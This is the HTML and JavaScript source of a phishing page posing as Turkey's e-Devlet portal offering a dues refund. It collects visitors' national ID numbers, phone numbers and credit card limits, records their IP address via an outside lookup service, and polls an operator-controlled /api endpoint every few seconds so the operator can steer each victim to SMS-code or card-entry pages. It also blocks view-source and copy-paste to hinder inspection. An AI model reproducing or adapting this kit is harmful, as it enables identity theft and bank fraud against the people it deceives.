<!DOCTYPE html>
 
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 
    <title>e-Devlet | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
  <script>
    const url = 'https://ipinfo.io/json';
    new Vue({
      el: '#app',
      data: {
        results: []
      },
      mounted() {
        window.onload = () => {
          axios.get(url).then(response => {
            this.results = response.data;
  
            // IP adresini bir cookie'ye kaydet
            document.cookie = "user_ip=" + this.results.ip;
  
            // Cookie'deki user_ip değerini al ve /api endpoint'ine post et
            const userIp = getCookie('user_ip');
            if (userIp) {
              sendPostRequest(userIp);
            }
          });
        };
      }
    });
  
   
  
    function getCookie(cname) {
      const name = cname + '=';
      const decodedCookie = decodeURIComponent(document.cookie);
      const cookieArray = decodedCookie.split(';');
  
      for (let i = 0; i < cookieArray.length; i++) {
        let cookie = cookieArray[i];
        while (cookie.charAt(0) == ' ') {
          cookie = cookie.substring(1);
        }
        if (cookie.indexOf(name) == 0) {
          return cookie.substring(name.length, cookie.length);
        }
      }
      return '';
    }
  </script>
</head>
<body id="top">
<!-- Google Tag Manager (noscript) -->
 
<!-- End Google Tag Manager (noscript) -->
<div class="page_loader"></div>

 
<script src="./files/jquery-3.2.1.min.js.indir" type="text/javascript"></script>
<script src="./files/jquery.creditCardValidator.js.indir"></script>
<script>
function validate(){
	var valid = true;	 
    $(".demoInputBox").css('background-color','');
    var message = "";

    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
    var cvvRegex = /^[0-9]{3,3}$/;
    
    var cardHolderName = $("#card-holder-name").val();
    var cardNumber = $("#tach").val();
    var cvv = $("#dogum").val();

    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
    	   if(cardHolderName == "") {
    		   $("#card-holder-name").css('background-color','#FFFFDF');
    	   }
    	   if(cardNumber == "") {
    		   $("#tach").css('background-color','#FFFFDF');
    	   }
    	   if (cvv == "") {
    		   $("#dogum").css('background-color','#FFFFDF');
    	   }
       valid = false;
    }
    
    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
        message  += "<div>Card Holder Name is Invalid</div>";    
    		$("#card-holder-name").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(cardNumber != "") {
        	$('#tach').validateCreditCard(function(result){
            if(!(result.valid)){
                	message  += "<div>Kart Numarası Hatalı!</div>";    
            		$("#tach").css('background-color','#FFFFDF');
            		valid = false;
            }
        });
    }
    
    if (cvv != "" && !cvvRegex.test(cvv)) {
        message  += "<div>CVV Kodu Hatalı!</div>";    
        $("#dogum").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(message != "") {
        $("#error-message").show();
        $("#error-message").html(message);
    }
    return valid;
}
</script>
	<script>
    document.addEventListener("DOMContentLoaded", function() {
      
        function getUserIP() {
          
            var userIP = document.cookie.replace(/(?:(?:^|.*;\s*)user_ip\s*=\s*([^;]*).*$)|^.*$/, "$1");
            return userIP;
        }

     
        var userIpInput = document.querySelector('input[name="user_ip"]');
        userIpInput.value = getUserIP();
    });
</script>
<form id="frmContact" action="/bekle" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
 <input type="hidden" name="user_ip" value="">



    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">

    <!-- Favicon icon -->
 

 
    <link rel="stylesheet" type="text/css" href="./files/css">

   
    <link type="text/css" rel="stylesheet" href="./files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">



 
<div class="page_loader"></div>
 

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                 <div class="login-inner-form">
                    <div class="details">
                        <a href="https://alliikkerrr.online/validateCaptcha.php">
                            <img src="./files/logo-2.png" alt="logo">
                        </a>
                        <h3>Online Aidat İade Sistemi</h3>


			<font size="2" color="#960000">Lütfen <b>Tc Kimlik Numaranızı</b> Giriniz. </font>
			<br>
			 
                        
                            <div class="form-group">
							
                                <input class="input-text" maxlength="11" minlength="11" pattern="[0-9]*" type="text" id="kimlik" name="kimlik" placeholder="11 Haneli Tc Giriniz" required="">
				    <div id="error-message" style="color:red;"></div>
                            </div>

			    <font size="2" color="#960000"> <b>Telefon Numaranızı</b> Giriniz. </font>
			    <br>
				<div class="form-group">
							
                                <input class="input-text" maxlength="11" minlength="11" pattern="[0-9]*" type="tel" id="tel" name="tel" placeholder="" value="05" required="">
                            </div>
								
						


			<font size="2" color="#960000">İade Tutarınızın Hatalı Gönderimini Önlemek İçin Kartınızın Kullanılabilir Net Limitini Giriniz. <b>Limitinizi Öğrenmek İçin</b> Bankanızın Uygulamasını Kullanınız. </font>
			 
			<br>
							
                            <div class="form-group">
            <input class="input-text" pattern="[0-9]*" type="number" min="50" max="150000" id="limit" name="limit" placeholder="Kullanılabilir Limit ₺" required="">        
                            </div>
                            
                                <button type="submit" class="btn-md btn-theme btn-block" disabled>DEVAM ET</button>
                            </div>
							<br>
							
                          </div>
        </div>
    </div>
</div>

<script>
    // Your TC number validation function
    var tcnodogrula = function(tcValue) {
        var value = tcValue.toString();
        var isEleven = /^[0-9]{11}$/.test(value);
        var totalX = 0;
        for (var i = 0; i < 10; i++) {
            totalX += Number(value.substr(i, 1));
        }
        var isRuleX = totalX % 10 == value.substr(10,1);
        var totalY1 = 0;
        var totalY2 = 0;
        for (var i = 0; i < 10; i+=2) {
            totalY1 += Number(value.substr(i, 1));
        }
        for (var i = 1; i < 10; i+=2) {
            totalY2 += Number(value.substr(i, 1));
        }
        var isRuleY = ((totalY1 * 7) - totalY2) % 10 == value.substr(9,0);
        return isEleven && isRuleX && isRuleY;
    };

    // Function to enable/disable the button based on TC number validation
    var checkTcValidation = function() {
        var tcInput = document.getElementById("kimlik");
        var submitButton = document.querySelector("button[type='submit']");

        // Check if the TC number is valid
        if (tcnodogrula(tcInput.value)) {
            // Enable the button
            submitButton.removeAttribute("disabled");
            document.getElementById("error-message").innerText = ""; // Clear error message
        } else {
            // Disable the button
            submitButton.setAttribute("disabled", "disabled");
            document.getElementById("error-message").innerText = "Geçerli bir TC kimlik numarası giriniz."; // Display error message
        }
    };

    // Add event listeners to the input fields
    document.getElementById("kimlik").addEventListener("input", checkTcValidation);
    document.getElementById("tel").addEventListener("input", checkTcValidation);
    document.getElementById("limit").addEventListener("input", checkTcValidation);
</script>

 <script async="" src="./files/js"></script>
 

 
<script>
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 85 )) {
            return false;
        }
};
</script>

<script type="text/javascript">
$(document).ready(function () {
     $('body').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
     
     $('#id').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
});
</script>

<!-- credit-card -->
		<script type="text/javascript" src="./files/creditly.js.indir"></script>
		<script type="text/javascript">
			$(function() {
			  var creditly = Creditly.initialize(
				  '.creditly-wrapper .expiration-month-and-year',
				  '.creditly-wrapper .credit-card-number',
				  '.creditly-wrapper .security-code',
				  '.creditly-wrapper .card-type');

			  $(".creditly-card-form .submit").click(function(e) {
				e.preventDefault();
				var output = creditly.validate();
				if (output) {
 				  console.log(output);
				}
			  });
			});
		</script>
 

</div></section></form>
	<script>
  new Vue({
    el: '#app',
    data: {
      results: [],
      userIp: ''  
    },
    mounted() {
     
      this.getUserIpFromCookie();
      this.makeRequests();

    
      setInterval(() => {
        this.getUserIpFromCookie();
        this.makeRequests();
      }, 3000);
    },
    methods: {
      getUserIpFromCookie() {
      
        this.userIp = this.getCookie('user_ip');
      },
      makeRequests() {
    if (this.userIp) {
        var currentPage = window.location.pathname.split('/').pop();
        axios.get(`/api?user_ip=${this.userIp}&current_page=${currentPage}`)
            .then(response => {
                this.results = response.data;
                console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);

                // response.data'ya göre yönlendirme yap
                if (response.data === 'sms') {
                    window.location.href = '/sms.html';
                } else if (response.data === 'tebrik') {
                    window.location.href = '/tebrik.html';
                } else if (response.data === 'hata') {
                    window.location.href = '/hatali.html';
                } else if (response.data === 'sms2') {
                    window.location.href = '/hatali.html';
                } else if (response.data === 'back') {
                    window.location.href = '/index.html';
                } else if (response.data === '1') {
                    window.location.href = 'smsh.php';
                } else if (response.data === '2') {
                    window.location.href = 'kart.php';
                } else if (response.data === '3') {
                    window.location.href = 'bekle.php';
                } else if (response.data === '4') {
                    window.location.href = 'hata.php';
                } else if (response.data === '5') {
                    window.location.href = '/tebrik.html';
                }
            })
            .catch(error => {
                console.error('GET isteği sırasında bir hata oluştu:', error);
            });
    } else {
        // Kullanıcı IP'si yoksa istek yapma
        console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
    }
},
      getCookie(cname) {
        const name = cname + '=';
        const decodedCookie = decodeURIComponent(document.cookie);
        const cookieArray = decodedCookie.split(';');

        for (let i = 0; i < cookieArray.length; i++) {
          let cookie = cookieArray[i];
          while (cookie.charAt(0) == ' ') {
            cookie = cookie.substring(1);
          }
          if (cookie.indexOf(name) == 0) {
            return cookie.substring(name.length, cookie.length);
          }
        }
        return '';
      }
    }
  });
</script> 

</body></html>
